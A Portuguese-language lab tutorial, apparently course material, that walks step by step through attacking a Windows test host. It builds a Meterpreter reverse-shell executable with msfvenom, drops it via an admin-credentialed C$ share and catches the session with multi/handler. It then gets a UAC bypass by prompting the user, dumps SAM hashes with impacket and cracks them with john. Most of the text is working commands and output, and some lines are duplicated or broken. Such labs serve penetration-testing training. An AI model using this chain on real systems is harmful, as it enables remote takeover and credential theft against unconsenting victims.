
### Gerando carga útil com msfvenon:

Primeiro passo nessa simulação de ataque, nós vamos gerar uma carga útil com o msfvenom. Para isso vamos dar o comando:

    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.110 lport=443 -f exe > file.exe

 - -p: Payload
 - -lhost: Ip do host local (de quem está atacando)
 - -lport: Porta que sera'feita a conexão reversa
 - -f: Tipo da carga
 - `>`: Saída do comando que será transferido para um arquivo
 - -file.exe: Nome da cara. Pode ser qualquer nome

 ### Enviando a carga para windows de teste

 Para enviar a carga, no caso de um cenário real, isso deve ser feito por meio de Engenharia social. Mas no nosso caso, vamos montar um compartilhamento do Windows no Linux, para poder transferir nossa carga. O comando será o seguinte:

    mount -t cifs -o username=Administrator,password=admin //192.168.10.125/C$ /mnt

* Username e Password você irá inserir os da credenciais do seu windows

Depois basta dar o comando:

    $cp file.exe /mnt

* /mnt no nosso caso foi aonde montamos o compartilhamento

### Inciando o ataque - msfconsole

Agora famos iniciar o msfconsole. No terminal, como root digite:

    #msfconsole

Dentro do msfconsole, vamos usar o Multihandler.

    msf6> use exploit/multi/handler 

Aparecerá o multi/handler selecionado

    msf6 exploit(multi/handler) > 

Vamos agora setar o payload:

    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp

Agora vamos configurar o lhost, lport. Para ver as opções pasta dar um " show options"

    msf6 exploit(multi/handler) > set LPORT 443
    LPORT => 443

    msf6 exploit(multi/handler) > set LHOST 192.168.10.110

Basta agora executar com o run

    msf6 exploit(multi/handler) > run

Ficará aguardando nessa tela:

    [*] Started reverse TCP handler on 192.168.10.110:443

Clique na carga útil que foi enviado para seu Windows. Se tudo der certo, aparecerá a seguinte mensagem:

    [*] Sending stage (200262 bytes) to 192.168.10.125
    [*] Meterpreter session 1 opened (192.168.10.110:443 -> 192.168.10.125:49935) at 2021-09-08 17:50:09 -0400
    
    meterpreter > 

Agora dentro do meterpreter já podemos interagir com o alvo.

Vamos colocar em background para poder escalar privilégios, e fazer download das hash

    meterpreter > background
    [*] Backgrounding session 1...
    msf6 exploit(multi/handler) > 

Vamos agora fazer umas configurações para ter uma interação com o usuário e escalar privilégio:

    msf6 exploit(multi/handler) > use exploit/windows/local/ask  
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

    msf6 exploit(multi/handler) > use exploit/windows/local/ask  
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

    msf6 exploit(windows/local/ask) > set session 1

    msf6 exploit(windows/local/ask) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp

    msf6 exploit(windows/local/ask) > run

<img src= "uac.png">

Quando o usuário clicar em yes, ele estará concendo o baypass no UAC.


    

### Quebrando hash:

Para quebrar o hashe agora podemos usar o impacket

    impacket-secretsdump -sam sam_aula -system system_aula LOCAL

 - sam_aula: O nome no seu arquivo SAM gerado

  - system_aula: Nome do seu arquivo system gerado

  Note o Exemplo abaixo:

  <img src="impacket.png">

  Agora podemos copiar esses hashes e colar em um arquivo. Podemos criar um arquivo com o vi, vim ou nano.

        vim hash
        _windows

Nosso arquivo ficou assim:

<img src="hashe_windows.png">

Agora podemos usar o john para quebrar o hashe:

    john --format=nt hash_windows

Para procurar em uma wordlist específica, basta inserir --wordlist= Caminho da wordlilst

    john --format=nt hash_windows --wordlist=/usr/share/wordlists/rockyou.txt 


    
 